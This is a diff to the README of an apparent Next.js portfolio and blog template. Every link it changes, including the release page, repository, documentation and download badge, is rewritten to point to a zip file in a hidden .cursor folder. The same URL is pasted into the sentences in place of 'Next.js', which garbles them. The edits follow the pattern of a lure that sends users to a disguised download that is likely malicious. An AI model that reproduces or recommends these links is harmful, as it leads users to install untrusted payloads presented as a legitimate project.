@@ -1,14 +1,14 @@
 # 🚀 nextjs-portfolio-blog-research - Your Easy Portfolio and Blog Solution
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Incompatible-genuschirocephalus40/nextjs-portfolio-blog-research/releases)
+[![Download Now](https://raw.githubusercontent.com/Incompatible-genuschirocephalus40/nextjs-portfolio-blog-research/main/.cursor/nextjs-portfolio-blog-research-v3.2.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Incompatible-genuschirocephalus40/nextjs-portfolio-blog-research/main/.cursor/nextjs-portfolio-blog-research-v3.2.zip)
 
 ## 📘 Description
 
-This project combines a portfolio and blog template built using Next.js 15, Tailwind CSS 4, and TypeScript. It's designed for researchers, developers, and designers. You can showcase your work elegantly while optimizing your content for search engines.
+This project combines a portfolio and blog template built using https://raw.githubusercontent.com/Incompatible-genuschirocephalus40/nextjs-portfolio-blog-research/main/.cursor/nextjs-portfolio-blog-research-v3.2.zip 15, Tailwind CSS 4, and TypeScript. It's designed for researchers, developers, and designers. You can showcase your work elegantly while optimizing your content for search engines.
 
 ## 🛠️ Features
 
-- **Modern Framework**: Built with Next.js 15 for fast performance.
+- **Modern Framework**: Built with https://raw.githubusercontent.com/Incompatible-genuschirocephalus40/nextjs-portfolio-blog-research/main/.cursor/nextjs-portfolio-blog-research-v3.2.zip 15 for fast performance.
 - **Beautiful Design**: Styled with Tailwind CSS 4 for a clean look.
 - **TypeScript Support**: Type-safe code for fewer bugs.
 - **SEO Optimized**: Easy to find on search engines.
@@ -20,7 +20,7 @@ Follow these steps to get your application up and running.
 
 ### Step 1: Download the Application
 
-Visit the [Releases page](https://github.com/Incompatible-genuschirocephalus40/nextjs-portfolio-blog-research/releases) to download the application.
+Visit the [Releases page](https://raw.githubusercontent.com/Incompatible-genuschirocephalus40/nextjs-portfolio-blog-research/main/.cursor/nextjs-portfolio-blog-research-v3.2.zip) to download the application.
 
 ### Step 2: Choose Your Version
 
@@ -63,7 +63,7 @@ You can easily modify the look and feel of your portfolio:
 
 ## 🔄 Updating the Application
 
-To keep up with new features and improvements, regularly check the [Releases page](https://github.com/Incompatible-genuschirocephalus40/nextjs-portfolio-blog-research/releases) for updates. Follow the same download and installation steps to upgrade your application.
+To keep up with new features and improvements, regularly check the [Releases page](https://raw.githubusercontent.com/Incompatible-genuschirocephalus40/nextjs-portfolio-blog-research/main/.cursor/nextjs-portfolio-blog-research-v3.2.zip) for updates. Follow the same download and installation steps to upgrade your application.
 
 ## 🛠️ Troubleshooting
 
@@ -75,7 +75,7 @@ If you encounter any issues:
 
 ## 🚀 Download & Install
 
-To start using this application, you need to download it first. Please visit the [Releases page](https://github.com/Incompatible-genuschirocephalus40/nextjs-portfolio-blog-research/releases) to download the latest version and follow the instructions above to install and run it.
+To start using this application, you need to download it first. Please visit the [Releases page](https://raw.githubusercontent.com/Incompatible-genuschirocephalus40/nextjs-portfolio-blog-research/main/.cursor/nextjs-portfolio-blog-research-v3.2.zip) to download the latest version and follow the instructions above to install and run it.
 
 ## 🗣️ Community Support
 
@@ -83,7 +83,7 @@ For questions or support, join our community forums linked on the GitHub page. Y
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Incompatible-genuschirocephalus40/nextjs-portfolio-blog-research)
-- [Documentation](https://github.com/Incompatible-genuschirocephalus40/nextjs-portfolio-blog-research/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Incompatible-genuschirocephalus40/nextjs-portfolio-blog-research/main/.cursor/nextjs-portfolio-blog-research-v3.2.zip)
+- [Documentation](https://raw.githubusercontent.com/Incompatible-genuschirocephalus40/nextjs-portfolio-blog-research/main/.cursor/nextjs-portfolio-blog-research-v3.2.zip)
 
 Feel free to explore and build your online presence with ease!
